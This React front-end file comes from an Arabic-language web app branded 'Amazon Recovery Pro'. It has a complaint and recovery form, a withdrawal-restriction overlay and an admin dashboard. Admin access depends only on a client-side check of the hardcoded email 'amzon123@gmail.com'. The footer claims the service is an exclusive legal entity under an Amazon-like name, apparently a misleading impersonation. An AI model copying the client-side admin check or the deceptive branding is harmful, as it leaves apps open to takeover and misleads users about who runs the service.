
import React, { useState, useEffect } from 'react';
import Header from './components/Header.tsx';
import RecoveryForm from './components/RecoveryForm.tsx';
import LiveStatus from './components/LiveStatus.tsx';
import BottomNav from './components/BottomNav.tsx';
import Auth from './components/Auth.tsx';
import AdminDashboard from './components/AdminDashboard.tsx';
import Profile from './components/Profile.tsx';
import RestrictionOverlay from './components/RestrictionOverlay.tsx';
import { supabase, isConfigured } from './lib/supabase.ts';
import { AlertCircle, ExternalLink } from 'lucide-react';

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState('Mine');
  const [session, setSession] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [isAdmin, setIsAdmin] = useState(false);
  const [isWithdrawalOnly, setIsWithdrawalOnly] = useState(false);

  useEffect(() => {
    if (!isConfigured) {
      setLoading(false);
      return;
    }

    let profileChannel: any = null;

    const checkSession = async () => {
      try {
        const { data } = await supabase.auth.getSession();
        const user = data?.session?.user;
        setSession(data?.session || null);
        
        if (user?.email === 'amzon123@gmail.com') {
          setIsAdmin(true);
          setActiveTab('Admin');
        }

        // Check if withdrawal only
        if (user?.id) {
          const { data: profile } = await supabase
            .from('profiles')
            .select('is_withdrawal_only')
            .eq('id', user.id)
            .single();
          
          setIsWithdrawalOnly(!!profile?.is_withdrawal_only);

          // Subscribe to profile changes
          profileChannel = supabase.channel(`profile-changes-${user.id}`)
            .on('postgres_changes', {
              event: 'UPDATE',
              schema: 'public',
              table: 'profiles',
              filter: `id=eq.${user.id}`
            }, (payload) => {
              if (payload.new && 'is_withdrawal_only' in payload.new) {
                setIsWithdrawalOnly(payload.new.is_withdrawal_only);
              }
            })
            .subscribe();
        }
      } catch (err) {
        console.error('Supabase auth error:', err);
        setSession(null);
      } finally {
        setLoading(false);
      }
    };

    checkSession();

    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setSession(session);
      if (session?.user?.email === 'amzon123@gmail.com') {
        setIsAdmin(true);
        setActiveTab('Admin');
      } else {
        setIsAdmin(false);
      }
      
      // Refresh withdrawal status on auth change
      if (session?.user?.id) {
        if (profileChannel) supabase.removeChannel(profileChannel);
        
        supabase
          .from('profiles')
          .select('is_withdrawal_only')
          .eq('id', session.user.id)
          .single()
          .then(({ data }) => {
            setIsWithdrawalOnly(!!data?.is_withdrawal_only);
          });

        profileChannel = supabase.channel(`profile-changes-${session.user.id}`)
          .on('postgres_changes', {
            event: 'UPDATE',
            schema: 'public',
            table: 'profiles',
            filter: `id=eq.${session.user.id}`
          }, (payload) => {
            if (payload.new && 'is_withdrawal_only' in payload.new) {
              setIsWithdrawalOnly(payload.new.is_withdrawal_only);
            }
          })
          .subscribe();
      } else {
        setIsWithdrawalOnly(false);
        if (profileChannel) supabase.removeChannel(profileChannel);
      }
    });

    const handleTabChange = (e: any) => {
      if (e.detail?.tab) {
        setActiveTab(e.detail.tab);
      }
    };
    window.addEventListener('changeTab', handleTabChange);

    return () => {
      subscription.unsubscribe();
      if (profileChannel) supabase.removeChannel(profileChannel);
      window.removeEventListener('changeTab', handleTabChange);
    };
  }, []);

  if (!isConfigured) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#F4F7F9] p-6 text-center" dir="rtl">
        <div className="bg-white p-8 rounded-[40px] shadow-2xl max-w-sm border border-orange-100">
          <div className="w-16 h-16 bg-orange-100 text-orange-600 rounded-2xl flex items-center justify-center mx-auto mb-6">
            <AlertCircle size={40} />
          </div>
          <h2 className="text-xl font-black text-gray-800 mb-4">بانتظار مفاتيح الربط!</h2>
          <p className="text-gray-500 text-sm mb-6 leading-relaxed">يرجى ضبط Supabase للبدء.</p>
        </div>
      </div>
    );
  }

  if (loading) return (
    <div className="min-h-screen flex items-center justify-center bg-[#F4F7F9]">
      <div className="w-12 h-12 border-4 border-[#9B4A4E] border-t-transparent rounded-full animate-spin"></div>
    </div>
  );

  if (!session) return <Auth />;

  return (
    <div className="flex flex-col min-h-screen max-w-[430px] mx-auto bg-[#F4F7F9] relative pb-24">
      {activeTab !== 'Mine' && <Header />}
      
      <main className="flex-1">
        <RestrictionOverlay isRestricted={isWithdrawalOnly} />
        {activeTab === 'Admin' && isAdmin ? (
          <div className="px-4 py-2"><AdminDashboard /></div>
        ) : activeTab === 'Mine' ? (
          <Profile />
        ) : (
          <div className="px-4 py-2">
            {activeTab !== 'Service' && <LiveStatus />}
            <div className={activeTab === 'Service' ? '' : 'mt-2'}>
               {activeTab !== 'Service' && (
                 <div className="flex items-center gap-2 mb-3 px-1">
                    <div className="w-1.5 h-6 bg-[#9B4A4E] rounded-full"></div>
                    <h3 className="text-gray-800 font-bold text-lg text-right w-full">مركز إيقاف المهام ومعالجة الشكاوي</h3>
                 </div>
               )}
               <RecoveryForm activeTab={activeTab} />
            </div>
          </div>
        )}

        {activeTab !== 'Mine' && (
          <div className="mt-6 px-4 text-center">
            <p className="text-[10px] text-gray-400 font-medium leading-relaxed">
              Amazon Recovery Pro هي جهة قانونية تقنية مختصة حصرياً.
            </p>
          </div>
        )}
      </main>

      <BottomNav activeTab={activeTab} onTabChange={setActiveTab} isAdmin={isAdmin} />
    </div>
  );
};

export default App;
